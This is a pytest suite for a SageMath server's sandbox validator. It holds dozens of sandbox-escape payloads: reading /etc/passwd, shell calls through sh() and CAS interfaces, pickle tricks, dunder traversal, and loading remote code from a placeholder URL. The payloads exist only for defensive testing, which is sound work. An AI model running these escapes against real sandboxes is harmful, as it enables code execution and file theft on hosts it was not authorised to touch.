"""Adversarial tests for the AST policy.

Each payload here was confirmed to escape the sandbox on a real SageMath worker
before the hardening landed: the uid probes returned 1001 and the builtins
subscript wrote a file despite `open()` being documented as blocked.

These must fail against the unhardened validator. A security test that has never
failed is not evidence of anything.
"""

from __future__ import annotations

import ast

import pytest

from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES
from sagemath_mcp.security import (
    SECURITY_POLICY,
    SecurityViolation,
    _bound_names,
    rewrite_permitted_imports,
    validate_module,
)

# (id, payload). Every one of these reached outside the sandbox.
BYPASS_PAYLOADS = [
    ("os-in-namespace", "os.getuid()"),
    ("getattr-indirection", "getattr(os, 'getuid')()"),
    ("dunder-traversal", "().__class__.__bases__[0].__subclasses__()"),
    ("builtins-attribute", "__builtins__.__import__('os').getuid()"),
    ("builtins-subscript", "__builtins__['open']('/tmp/probe', 'w').write('escaped')"),
    ("sage-eval-string", "sage_eval(\"__import__('os').getuid()\")"),
    ("attribute-chain", "sage.misc.temporary_file.os.getuid()"),
]

# The README's security table claims these are blocked wholesale.
DOCUMENTED_AS_BLOCKED = [
    ("subprocess-run", "subprocess.run(['id'])"),
    ("subprocess-popen", "subprocess.Popen(['id'])"),
    ("pathlib-read", "pathlib.Path('/etc/passwd').read_text()"),
    ("socket-open", "socket.socket()"),
    ("shutil-copy", "shutil.copy('a', 'b')"),
    ("os-listdir", "os.listdir('/')"),
    ("os-environ", "os.environ"),
    ("os-chmod", "os.chmod('a', 511)"),
    ("sys-modules", "sys.modules"),
]


def _validate(code: str) -> None:
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


@pytest.mark.parametrize(
    ("case_id", "payload"), BYPASS_PAYLOADS, ids=[c for c, _ in BYPASS_PAYLOADS]
)
def test_known_bypasses_are_rejected(case_id: str, payload: str) -> None:
    with pytest.raises(SecurityViolation):
        _validate(payload)


@pytest.mark.parametrize(
    ("case_id", "payload"), DOCUMENTED_AS_BLOCKED, ids=[c for c, _ in DOCUMENTED_AS_BLOCKED]
)
def test_documented_blocks_are_actually_enforced(case_id: str, payload: str) -> None:
    """What the README promises must be what the validator does."""
    with pytest.raises(SecurityViolation):
        _validate(payload)


# Legitimate work must keep working; over-blocking would be its own outage.
ALLOWED = [
    ("arithmetic", "2 + 2"),
    ("sage-symbolics", "var('x'); integrate(sin(x), x)"),
    # No imports here any more: those three cases moved to the trusted policy,
    # where the generated templates need them. A caller reaching factorial or
    # math.sqrt does it through the preloaded namespace, which is how the
    # documented examples were always written.
    ("sage-names-without-import", "factorial(5)"),
    ("stdlib-names-without-import", "sqrt(2)"),
    ("polynomial-ring-internals", "R = PolynomialRing(QQ, ['a', 'b']); R.gens()"),
    ("method-calls", "G = graphs.PetersenGraph(); G.chromatic_number()"),
    ("attribute-on-result", "matrix([[1,2],[3,4]]).determinant()"),
    ("comprehension", "[k**2 for k in range(5)]"),
    ("function-def", "def f(y):\n    return y + 1\nf(2)"),
]


@pytest.mark.parametrize(("case_id", "payload"), ALLOWED, ids=[c for c, _ in ALLOWED])
def test_legitimate_code_still_passes(case_id: str, payload: str) -> None:
    _validate(payload)


# Every spelling below reaches a forbidden builtin WITHOUT naming it in call
# position. The first two were reported as still exploitable after the initial
# hardening: both returned the first line of /etc/passwd, through evaluate_sage
# and through calculate_expression. Checking ast.Call.func alone is not enough --
# the name has to be rejected wherever it is referenced.
ALIASING_PAYLOADS = [
    ("alias-assignment", "f = open\nf('/etc/passwd').readline()"),
    ("lambda-default", "(lambda f=open: f('/etc/passwd').readline())()"),
    ("alias-getattr", "g = getattr\ng(os, 'getuid')()"),
    ("list-literal", "[open][0]('/etc/passwd').readline()"),
    ("tuple-literal", "(open,)[0]('/etc/passwd').read()"),
    ("dict-value", "{'k': open}['k']('/etc/passwd').read()"),
    ("comprehension", "[fn for fn in (open,)][0]('/etc/passwd').read()"),
    ("bare-reference", "open"),
    ("default-in-def", "def g(h=eval):\n    return h('1+1')\ng()"),
    ("conditional-alias", "f = open if True else print\nf('/etc/passwd')"),
    ("alias-sage-eval", "se = sage_eval\nse(\"__import__('os').getuid()\")"),
]


@pytest.mark.parametrize(
    ("case_id", "payload"), ALIASING_PAYLOADS, ids=[c for c, _ in ALIASING_PAYLOADS]
)
def test_forbidden_names_cannot_be_aliased(case_id: str, payload: str) -> None:
    with pytest.raises(SecurityViolation):
        _validate(payload)


def test_restricted_builtins_exclude_the_dangerous_ones() -> None:
    """The namespace backstop, independent of the AST rules.

    If a spelling ever slips past the validator again, the object should not be
    reachable in the first place.
    """
    from sagemath_mcp._sage_worker import _restricted_builtins

    available = _restricted_builtins()
    denied = (
        "open", "eval", "exec", "compile", "input", "globals", "locals", "vars",
    )
    for name in denied:
        assert name not in available, f"{name} is still reachable in the worker namespace"
    # Ordinary mathematics must keep working.
    # __import__ stays, and this asserts it deliberately: removing it was tried
    # for item 18 and broke Sage's Singular bindings with KeyError('__import__').
    for needed in ("abs", "len", "range", "sum", "int", "float", "print", "sorted", "__import__"):
        assert needed in available, f"{needed} was removed and normal code will break"


# Aliasing a forbidden MODULE, which the first alias fix did not cover: it
# checked forbidden call names only, so `m = os` still handed over the module.
MODULE_ALIAS_PAYLOADS = [
    ("bare module load", "os"),
    ("module alias", "m = os\nm.getuid()"),
    ("module alias via tuple", "(a, b) = (os, sys)\na.getuid()"),
    ("module in a container", "[os][0].getuid()"),
    ("module as a default", "(lambda m=os: m.getuid())()"),
    ("import-as alias", "from sage.all import os as m\nm.getuid()"),
    ("import-as under another name", "from sage.all import subprocess as sp"),
    ("sys alias", "s = sys\ns.modules"),
    ("shutil alias", "sh = shutil\nsh.rmtree('/tmp/x')"),
    ("socket alias", "sk = socket\nsk.socket()"),
    ("pathlib alias", "pl = pathlib\npl.Path('/etc/passwd').read_text()"),
    ("builtins alias", "b = builtins\nb.open('/etc/passwd')"),
]


@pytest.mark.parametrize(
    "label,payload", MODULE_ALIAS_PAYLOADS, ids=[p[0] for p in MODULE_ALIAS_PAYLOADS]
)
def test_module_aliases_are_blocked(label: str, payload: str) -> None:
    """`m = os` returned the container uid from real SageMath before this."""
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_forbidden_modules_are_absent_from_the_worker_namespace() -> None:
    """Second layer: even if a spelling slips past, there is nothing to bind.

    `from sage.all import *` binds os, sys and friends as ordinary globals.

    `operator` is the one exception and it is deliberate: it stays in the
    namespace so that `operator.le` resolves, while remaining a forbidden parent
    so that everything reached through it is refused *except* the arithmetic and
    comparison functions the policy names one at a time. The property this test
    protects is unchanged for it -- see
    `test_operator_is_a_subset_and_not_a_module`, which asserts that the module
    object cannot be bound and that an unlisted attribute is refused.
    """
    from sagemath_mcp._sage_worker import _build_namespace

    namespace = _build_namespace()
    permitted = {module for module, _ in SECURITY_POLICY.allowed_module_attributes}
    present = [
        name
        for name in SECURITY_POLICY.forbidden_attribute_parents
        if name in namespace and name not in permitted
    ]
    assert not present, f"forbidden modules reachable in the worker namespace: {present}"


def test_specialized_tool_rejects_an_aliased_payload() -> None:
    """The public path, not just the validator.

    calculate_expression embeds its argument into generated code that runs under
    the trusted policy, so a fragment that escapes _validated_expression is not
    validated again downstream.
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    for payload in (
        "(lambda f=open: f('/etc/passwd').readline())()",
        "[os][0].getuid()",
        "(lambda m=os: m.getuid())()",
    ):
        with pytest.raises(ToolError, match="security policy"):
            _validated_expression(payload)


def test_unparseable_fragments_are_screened_not_waved_through() -> None:
    """A fragment that will not parse used to skip validation entirely."""
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    # Still accepted: the documented equation spelling is not a Python expression.
    assert _validated_expression("x^2 - 1 = 0") == "x^2 - 1 = 0"
    # Screened at token level once no parse tree is available.
    with pytest.raises(ToolError):
        _validated_expression("R.<a> = os.getuid()")


# --- Item 18: caller strings interpolated into TRUSTED code -----------------
# Generated code runs under trusted_policy(), which re-permits sage_eval because
# the helper templates are built on it. Any caller string reaching that code
# unvalidated is therefore arbitrary execution: sage_eval evaluates a string at
# runtime, where the AST validator cannot see it. These four parameters were
# interpolated raw, and each returned the container uid from real SageMath.

TRUSTED_INTERPOLATION_PAYLOAD = "sage_eval('__import__(\"os\").getuid()')"


def _trusted_cases():
    p = TRUSTED_INTERPOLATION_PAYLOAD
    return [
        ("graph_operation.graph", "graph_operation",
         {"graph": f"CompleteGraph({p})", "operation": "order"}),
        ("graph_operation.graph literal branch", "graph_operation",
         {"graph": f"{{0:[1]}} if {p} else {{0:[1]}}", "operation": "order"}),
        ("group_operation.group", "group_operation",
         {"group": f"SymmetricGroup({p})", "operation": "order"}),
        ("coding_theory_operation.code_type", "coding_theory_operation",
         {"code_type": f"HammingCode(GF(2), {p} - 998)", "operation": "dimension"}),
        ("polynomial_ring_operation.base_ring", "polynomial_ring_operation",
         {"base_ring": f"QQ if {p} else QQ", "ring_vars": ["x"],
          "polynomials": ["x^2-1"], "operation": "ideal_dimension"}),
    ]


@pytest.mark.parametrize(
    "label,tool_name,kwargs", _trusted_cases(), ids=[c[0] for c in _trusted_cases()]
)
@pytest.mark.asyncio
async def test_trusted_templates_reject_sage_eval_payloads(
    label, tool_name, kwargs, monkeypatch
):
    """Rejected before the code is ever built, so no Sage runtime is needed."""
    from fastmcp.exceptions import ToolError

    from sagemath_mcp import runtime, server
    from sagemath_mcp.config import SageSettings
    from sagemath_mcp.session import SageSessionManager

    from .conftest import FakeContext

    manager = SageSessionManager(SageSettings(force_python_worker=True))
    monkeypatch.setattr(runtime, "SESSION_MANAGER", manager)
    tool = getattr(server, tool_name)
    try:
        with pytest.raises(ToolError, match="security policy"):
            await tool(ctx=FakeContext("trusted-interp"), **kwargs)
    finally:
        await manager.shutdown()


def test_prelude_rejects_names_that_are_not_identifiers() -> None:
    """_sage_prelude quotes each name into generated code.

    A name carrying a quote escapes that string literal, which is the same
    injection one level down.
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _sage_prelude

    with pytest.raises(ToolError):
        _sage_prelude(["x', sage_eval('1+1'), 'y"])
    # Ordinary names still work.
    assert "'a'" in _sage_prelude(["a"])


# --- Reaching a forbidden function through an attribute chain -----------------
# The name checks look at bare Name nodes and Call.func. `sage` is an allowed
# import root and none of its segments are forbidden, so the same function is
# reachable one dot further along: sage.misc.sage_eval.sage_eval(...) returned
# the container uid. The string is invisible to the validator, exactly as in
# item 18 -- only the path to it is different.
ATTRIBUTE_PATH_PAYLOADS = [
    ("sage.misc.sage_eval", "sage.misc.sage_eval.sage_eval('__import__(\"os\").getuid()')"),
    ("sage.all.sage_eval", "sage.all.sage_eval('1')"),
    ("sage.repl.preparse", "sage.repl.preparse.preparse('2^3')"),
    ("nested attribute eval", "sage.misc.sage_eval.sage_eval"),
    ("persist.load", "sage.misc.persist.load('/tmp/x')"),
]


@pytest.mark.parametrize(
    "label,payload", ATTRIBUTE_PATH_PAYLOADS, ids=[p[0] for p in ATTRIBUTE_PATH_PAYLOADS]
)
def test_forbidden_functions_are_blocked_through_attribute_paths(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


# Sage's loaders execute code from a path -- and `load` accepts a URL, so this is
# remote code execution, not merely local file reading. Neither was forbidden.
LOADER_PAYLOADS = [
    ("load", "load('/tmp/payload.sage')"),
    ("attach", "attach('/tmp/payload.sage')"),
    ("load a URL", "load('https://example.invalid/payload.sage')"),
    ("aliased load", "runner = load\nrunner('/tmp/payload.sage')"),
]


@pytest.mark.parametrize("label,payload", LOADER_PAYLOADS, ids=[p[0] for p in LOADER_PAYLOADS])
def test_sage_loaders_are_blocked(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_ordinary_sage_attribute_use_still_works() -> None:
    """The gate is the final name, not the presence of a dot."""
    for code in (
        "sage.functions.log.exp(1)",
        "matrix([[1, 2], [3, 4]]).determinant()",
        "sage.rings.integer.Integer(5)",
        "plot(sin(x), (x, 0, 1)).matplotlib()",
    ):
        validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


# --- Sage's own dangerous helpers --------------------------------------------
# Sage's namespace is thousands of names deep and includes a compiler, a shell,
# a downloader and pickle. cython(get_remote_file(url)) is download, compile and
# execute in one expression, and none of it involved a name any rule mentioned.
SAGE_HELPER_PAYLOADS = [
    ("cython compiles code", "cython('print(1)')"),
    ("cython_lambda", "cython_lambda('int n', 'return n')"),
    ("fortran compiles code", "fortran('subroutine s\\nend')"),
    ("sh runs a shell", "sh('id')"),
    ("get_remote_file downloads", "get_remote_file('https://example.invalid/p.pyx')"),
    ("the whole chain", "cython(get_remote_file('https://example.invalid/p.pyx'))"),
    ("pickle load", "loads(b'')"),
    ("pickle dump", "dumps(1)"),
    ("save writes a file", "save(1, '/tmp/probe')"),
    ("db_save writes", "db_save(1, 'probe')"),
    ("trace debugger", "trace('1+1')"),
    ("via attribute path", "sage.misc.cython.cython('print(1)')"),
    ("shell via attribute", "sage.misc.sh.sh('id')"),
]


@pytest.mark.parametrize(
    "label,payload", SAGE_HELPER_PAYLOADS, ids=[p[0] for p in SAGE_HELPER_PAYLOADS]
)
def test_sage_helpers_that_execute_or_fetch_are_blocked(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_the_namespace_scrub_removes_a_modules_own_definitions() -> None:
    """The backstop, and the part that scales.

    Naming helpers in the policy gives a clear refusal; removing them by where
    they come from covers the one nobody has thought of, including anything a
    future Sage release adds to those modules. Exercised against a stdlib module
    so it runs without Sage.
    """
    from sagemath_mcp import _sage_worker

    names = _sage_worker._dangerous_sage_names.__wrapped__ if hasattr(
        _sage_worker._dangerous_sage_names, "__wrapped__"
    ) else _sage_worker._dangerous_sage_names

    original = _sage_worker._DANGEROUS_SAGE_MODULES
    original_list = _sage_worker._DANGEROUS_SAGE_NAME_LIST
    try:
        _sage_worker._DANGEROUS_SAGE_MODULES = ("json.encoder",)
        found = names()
        assert "JSONEncoder" in found, "a module's own definitions were not collected"

        # Stripping reads the baked-in list, not the derivation: that is what
        # keeps worker startup free.
        _sage_worker._DANGEROUS_SAGE_NAME_LIST = frozenset({"JSONEncoder"})
        namespace = {"JSONEncoder": object(), "Integer": object()}
        removed = _sage_worker._strip_dangerous_sage_names(namespace)
        assert removed == 1
        assert "JSONEncoder" not in namespace
        assert "Integer" in namespace, "unrelated names must survive"
    finally:
        _sage_worker._DANGEROUS_SAGE_MODULES = original
        _sage_worker._DANGEROUS_SAGE_NAME_LIST = original_list


def test_the_scrub_only_takes_what_a_module_defines() -> None:
    """sage.misc.persist has Integer and ZZ in scope; removing those would break
    the mathematics this server exists to do."""
    from sagemath_mcp import _sage_worker

    original = _sage_worker._DANGEROUS_SAGE_MODULES
    try:
        # json.encoder imports `re`; `re` is not defined there, so it must not
        # be collected merely for being in scope.
        _sage_worker._DANGEROUS_SAGE_MODULES = ("json.encoder",)
        assert "re" not in _sage_worker._dangerous_sage_names()
    finally:
        _sage_worker._DANGEROUS_SAGE_MODULES = original


def test_the_scrub_ignores_a_module_it_cannot_import() -> None:
    """A missing module must not break startup."""
    from sagemath_mcp import _sage_worker

    original = _sage_worker._DANGEROUS_SAGE_MODULES
    original_exports = _sage_worker._EXTERNAL_INTERFACE_EXPORTS
    try:
        # Both sources must be neutralised: with Sage installed the interface
        # export list still contributes its 74 names, which is the point of it.
        _sage_worker._DANGEROUS_SAGE_MODULES = ("definitely.not.a.module",)
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = "definitely.not.a.module"
        assert _sage_worker._dangerous_sage_names() == frozenset()
    finally:
        _sage_worker._DANGEROUS_SAGE_MODULES = original
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = original_exports


# --- Sage's interfaces to other CAS programs ---------------------------------
# Each spawns the real program, and those programs have their own shell escapes.
# gp('system("id > /tmp/x")') and maxima(...) both wrote a file as the container
# user -- arbitrary shell execution, from names no rule mentioned.
INTERFACE_PAYLOADS = [
    ("gp", "gp('system(\"id\")')"),
    ("maxima", "maxima('system(\"id\")')"),
    ("gap", "gap('Exec(\"id\")')"),
    ("singular", "singular('system(\"sh\")')"),
    ("octave", "octave('system(\"id\")')"),
    ("magma", "magma('System(\"id\")')"),
    ("a subprocess Sage", "sage0('__import__(\"os\").system(\"id\")')"),
]


@pytest.mark.parametrize(
    "label,payload", INTERFACE_PAYLOADS, ids=[p[0] for p in INTERFACE_PAYLOADS]
)
def test_external_cas_interfaces_are_blocked(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_the_interface_export_list_is_used_when_it_can_be_imported() -> None:
    """Sage's own list is the source of truth; here it is stood in for.

    Without Sage the import fails and the set is empty, so the branch that
    actually removes the interfaces would never run in the unit suite.
    """
    from sagemath_mcp import _sage_worker

    original_exports = _sage_worker._EXTERNAL_INTERFACE_EXPORTS
    original_modules = _sage_worker._DANGEROUS_SAGE_MODULES
    try:
        # json.decoder exports JSONDecoder and friends; it stands in for
        # sage.interfaces.all, whose whole export list is what gets removed.
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = "json.decoder"
        _sage_worker._DANGEROUS_SAGE_MODULES = ()
        found = _sage_worker._dangerous_sage_names()
        assert "JSONDecoder" in found, "the export list was not consumed"
        # Unlike the per-module rule, everything exported goes -- an interface
        # re-exported from elsewhere is still an interface.
        assert "scanstring" in found
    finally:
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = original_exports
        _sage_worker._DANGEROUS_SAGE_MODULES = original_modules


# --- Imports re-create everything the namespace scrub removed ------------------
# The scrub takes dangerous helpers out of the worker namespace, but a caller who
# imports the module gets a fresh copy. Measured against real SageMath:
#   from sage.misc.cython import compile_and_load as f; f('print(1)')  compiled
#   from sage.interfaces.gp import Gp as P; P()('2+2')                 spawned GP
#   from sage.misc.persist import unpickle_global as f
#   f('os', 'system')('id')                                            ran a shell
# Aliasing hides the name from every rule, so the gate has to be the import.
IMPORT_PAYLOADS = [
    ("from-import aliased", "from sage.misc.cython import compile_and_load as f\nf('print(1)')"),
    ("interface class", "from sage.interfaces.gp import Gp as P\nP()('2+2')"),
    ("module alias", "import sage.misc.cython as c\nc.compile_and_load('x')"),
    ("unpickle_global to os.system",
     "from sage.misc.persist import unpickle_global as f\nf('os', 'system')('id')"),
    ("sage.all wholesale", "from sage.all import *"),
    ("plain sage", "import sage"),
    ("stdlib is not special", "import math\nmath.sqrt(4)"),
    ("io", "import io"),
]


@pytest.mark.parametrize("label,payload", IMPORT_PAYLOADS, ids=[p[0] for p in IMPORT_PAYLOADS])
def test_caller_code_cannot_import_anything(label, payload) -> None:
    """Callers get a preloaded namespace; they never need an import.

    Allowing `sage.*` was there for the generated prelude, and it handed callers
    the whole library back one import at a time.
    """
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_generated_code_may_still_import_what_its_templates_need() -> None:
    """The prelude does `from sage.all import *`; templates use base64 and io."""
    from sagemath_mcp.security import trusted_policy

    for code in (
        "from sage.all import *\n1",
        "from sage.all import sage_eval\n1",
        "import sage.all as _sage_ns\n1",
        "import base64\n1",
        "import io\n1",
    ):
        validate_module(ast.parse(code), code=code, policy=trusted_policy())


def test_dangerous_module_paths_are_blocked_as_attributes_too() -> None:
    """Blocking the import is not enough if `sage` itself is in the namespace."""
    for code in (
        "sage.misc.persist.unpickle_global('os', 'system')",
        "sage.interfaces.gp.Gp()",
        "sage.misc.remote_file.get_remote_file('http://x/y')",
        "sage.repl.load.load_wrap('x')",
    ):
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


def test_even_generated_code_may_not_import_a_forbidden_module() -> None:
    """The trusted policy relaxes sage_eval and the import allowlist, nothing else.

    `sage` is allowlisted there, and `from sage.all import os as m` binds the real
    os module under a name no later rule would recognise. Unreachable from caller
    code now that callers cannot import at all, which is exactly why it needs a
    test of its own.
    """
    from sagemath_mcp.security import trusted_policy

    for code in (
        "from sage.all import os as m",
        "from sage.all import subprocess",
        "import sage.all\nfrom sage.all import sys as s",
    ):
        with pytest.raises(SecurityViolation, match="not permitted"):
            validate_module(ast.parse(code), code=code, policy=trusted_policy())


# --- Writing files through object methods -------------------------------------
# .save() was on the forbidden list; .dump(), .save_image() and .export_jmol()
# were not, and each wrote a real file. Matched by prefix now, because Sage's
# persistence API is longer than any list of names would stay.
PERSISTENCE_PAYLOADS = [
    ("dump", "(1/2).dump('/tmp/x')"),
    ("matrix dump", "matrix([[1,2],[3,4]]).dump('/tmp/x')"),
    ("save_image", "plot(sin(x), (x,0,1)).save_image('/tmp/x.png')"),
    ("export_jmol", "sphere((0,0,0), 1).export_jmol('/tmp/x.spt')"),
    ("savefig to a path", "plot(sin(x), (x,0,1)).matplotlib().savefig('/tmp/x.png')"),
    ("save", "plot(sin(x), (x,0,1)).save('/tmp/x.png')"),
]


@pytest.mark.parametrize(
    "label,payload", PERSISTENCE_PAYLOADS, ids=[p[0] for p in PERSISTENCE_PAYLOADS]
)
def test_caller_code_cannot_persist_to_disk(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_generated_plot_templates_may_still_render_to_a_buffer() -> None:
    """The plots render with .savefig(BytesIO) -- a prefix rule that broke that
    would take all three plotting tools with it."""
    from sagemath_mcp.security import trusted_policy

    code = "_fig.savefig(_buf, format='png')"
    validate_module(ast.parse(code), code=code, policy=trusted_policy())


def test_a_caught_exception_name_is_readable() -> None:
    """`except ... as err` binds a name the caller then reads."""
    code = "try:\n    1 / 0\nexcept ZeroDivisionError as err:\n    str(err)"
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


def test_var_with_a_non_literal_argument_declares_nothing() -> None:
    """`var(name)` cannot be read statically, so it binds nothing.

    The names it makes at runtime land in the session namespace, and the worker
    reports those on the next call -- so this refuses only within the snippet
    that made them, which is the honest answer for a static check.
    """
    label = "t"  # noqa: F841 - mirrors the caller code below
    code = "label = 't'\nvar(label)\nlabel"
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)

    # And a literal still declares, including several at once.
    code = "var('p q')\np + q"
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


def test_a_binding_primitive_cannot_launder_a_name_across_calls() -> None:
    """Session trust is what validated code BOUND, not what the namespace gained.

    `lazy_import('os', 'system')` reads no forbidden name: it binds one. Trusting
    the namespace diff meant call one created the binding and call two read it
    back as "the caller's own" -- and ran a shell. Recording static bindings from
    approved code closes that for every such primitive, including any not yet
    found.
    """
    created = _bound_names(ast.parse("lazy_import('os', 'system')"))
    assert "system" not in created, (
        "a name created by a call, not an assignment, must not count as bound"
    )

    # An assignment does count, which is what keeps stateful sessions working.
    assert "total" in _bound_names(ast.parse("total = 1 + 1"))
    assert {"p", "q"} <= _bound_names(ast.parse("var('p q')"))


@pytest.mark.parametrize(
    "payload",
    [
        "lazy_import('os', 'system')",
        "unpickle_function(b'x')",
        "pickle_function(sin)",
        "load_session('/tmp/x')",
        "save_session('/tmp/x')",
        "set_verbose_files('/tmp/x')",
    ],
)
def test_binding_and_pickle_primitives_are_gone(payload: str) -> None:
    """Each was reachable, and each is a way to execute or persist."""
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_a_binding_cannot_authorize_a_dunder() -> None:
    """The gap the allowlist leaves, and why it is closed at the source.

    Every name live in the worker namespace is on the allowlist except nine
    dunders (`__builtins__`, `__import__`, `__build_class__`, ...). A caller
    binding is trusted without consulting the allowlist, so a binding that never
    executes -- `if False: __builtins__ = 1`, or `except ValueError as
    __builtins__`, which binds without ever naming the object -- would authorize
    reading the real one, and `__builtins__['__import__']('os')` is a shell.

    Reading a dunder is independently blocked, so this was defence in depth
    rather than a hole. But that made the whole allowlist rest on a rule
    elsewhere, and on the accident that nothing non-dunder sits in the gap. A
    name a caller may not read is not a name their binding may authorize.
    """
    for code in (
        "if False:\n    __builtins__ = 1",
        "try:\n    raise ValueError()\nexcept ValueError as __builtins__:\n    pass",
        "for __import__ in []:\n    pass",
        "def __build_class__():\n    pass",
        "import os as __loader__",
    ):
        bound = _bound_names(ast.parse(code))
        assert not any(name.startswith("__") for name in bound), (
            f"{code!r} authorized a dunder: {sorted(bound)}"
        )

    # The ordinary case is untouched: real bindings still authorize their names.
    assert "total" in _bound_names(ast.parse("total = 1"))
    assert "err" in _bound_names(
        ast.parse("try:\n    pass\nexcept ValueError as err:\n    pass")
    )


def test_the_preparsers_scratch_name_is_written_but_never_readable() -> None:
    """`f(x) = x^2 + 1` -- and the one dunder that has to survive the rule.

    Sage's preparser expands its function-definition syntax into

        __tmp__=var("x"); f = symbolic_expression(...).function(x)

    and this server validates the *preparsed* source, so the blanket dunder ban
    refused the first syntax in the Sage tutorial. `V(r) = -1/r` is how a
    physicist writes a potential; the refusal was not a corner case, and no test
    in the suite used the form.

    The relaxation is one name in one context. A store cannot leak anything --
    the value written is the caller's own -- while a load can, so `__tmp__` is
    writable and unreadable, and every other dunder stays refused in both.
    """
    # Exactly what SageMath 10.9's preparser emits for `f(x) = x^2 + 1`.
    preparsed = (
        '__tmp__=var("x"); f = symbolic_expression(x**Integer(2) + Integer(1)).function(x)'
    )
    validate_module(ast.parse(preparsed), code=preparsed, policy=SECURITY_POLICY)

    # Reading it back is not part of the deal, in any position.
    for payload in (
        "__tmp__",
        "y = __tmp__",
        "print(__tmp__)",
        "[__tmp__ for _ in range(1)]",
    ):
        with pytest.raises(SecurityViolation, match="dunder"):
            validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)

    # And no other dunder gained a write. `__builtins__ = {...}` is a store.
    for payload in (
        "__builtins__ = 1",
        "__class__ = 1",
        "__loader__, __tmp__ = 1, 2",
        "for __builtins__ in []:\n    pass",
    ):
        with pytest.raises(SecurityViolation, match="dunder"):
            validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)

    # The relaxation is a store of that one name, not an attribute of it:
    # `obj.__tmp__ = v` is still an attribute write on a dunder.
    with pytest.raises(SecurityViolation, match="dunder"):
        validate_module(ast.parse("f.__tmp__ = 1"), code="f.__tmp__ = 1", policy=SECURITY_POLICY)


def test_a_never_executed_binding_still_cannot_reach_a_blocked_name() -> None:
    """The other half: static binding is deliberately an over-approximation.

    `_bound_names` does not ask whether the assignment runs -- it cannot, short
    of executing the code. So the guarantee has to come from the other side:
    authorizing a name must never be enough to reach an object the caller could
    not otherwise have.
    """
    module = ast.parse("if False:\n    __builtins__ = 1\n__builtins__['__import__']('os')")
    with pytest.raises(SecurityViolation, match="dunder"):
        validate_module(module, extra_allowed_names=frozenset({"__builtins__"}))


# --- String-based attribute traversal ------------------------------------------
# Every attribute rule this server has is enforced on the AST: the parent and the
# attribute name are both read out of the source. `operator.attrgetter` takes its
# path as a *runtime string*, so none of that machinery sees it, and Sage's
# namespace binds `sage` itself -- which made the whole module tree reachable.
#
# Confirmed against SageMath 10.9 before the fix, each of these worked:
#   operator.attrgetter("misc.persist.unpickle_global")(sage)  -> the real function
#   operator.attrgetter("__builtins__")(warnings)              -> the builtins dict
#   operator.attrgetter("__class__.__base__.__subclasses__")(1)()
#   operator.methodcaller("save", "/tmp/x")(matrix([[1, 2], [3, 4]]))  -> wrote it
# The first is arbitrary code execution; the second reaches __import__.

STRING_TRAVERSAL_PAYLOADS = [
    ("attrgetter-sage-tree", 'operator.attrgetter("misc.persist.unpickle_global")(sage)'),
    ("attrgetter-builtins", 'operator.attrgetter("__builtins__")(warnings)'),
    ("attrgetter-subclasses", 'operator.attrgetter("__class__.__base__.__subclasses__")(1)()'),
    ("methodcaller-save", 'operator.methodcaller("save", "/tmp/x")(matrix([[1, 2], [3, 4]]))'),
    ("itemgetter", 'operator.itemgetter(0)([1, 2])'),
    ("bare-attrgetter", 'attrgetter("__class__")(1)'),
    ("bare-methodcaller", 'methodcaller("save", "/tmp/x")(matrix([[1, 2]]))'),
]


@pytest.mark.parametrize(
    "code", [c for _, c in STRING_TRAVERSAL_PAYLOADS],
    ids=[i for i, _ in STRING_TRAVERSAL_PAYLOADS],
)
def test_string_based_attribute_traversal_is_refused(code: str) -> None:
    """No primitive may fetch an attribute by a name the AST cannot see.

    This is a class, not a list of names: any such primitive makes every
    attribute rule here decorative. The defence is that none is reachable.
    """
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(code))


@pytest.mark.parametrize("name", ["warnings", "pari", "oeis"])
def test_dangerous_modules_are_not_offered_to_callers(name: str) -> None:
    """`pari` ran a shell; `oeis` reached the network.

    `pari('system("id > /tmp/x")')` wrote a file as the container user -- the
    PARI *library* interface was never covered by the external-interface scrub
    that took `gp` and `maxima`, because it comes from `sage.libs.pari`.

    `operator` was in this list and has moved to the test below: it is now live
    in the namespace and offered by the allowlist, with every attribute of it
    refused except the arithmetic and comparison functions. The property that
    matters is unchanged and asserted there -- nothing that traverses by string
    is reachable through it.
    """
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    assert name not in ALLOWED_CALLER_NAMES, (
        f"{name!r} is offered to callers; it was proven to execute a shell, reach "
        f"the network or defeat the attribute rules"
    )
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(f"{name}.anything"))


def test_operator_is_a_subset_and_not_a_module() -> None:
    """What `operator` may be used for, and what it may not.

    It stays a forbidden attribute parent, so the default for anything reached
    through it is *refused*; a named list of arithmetic and comparison functions
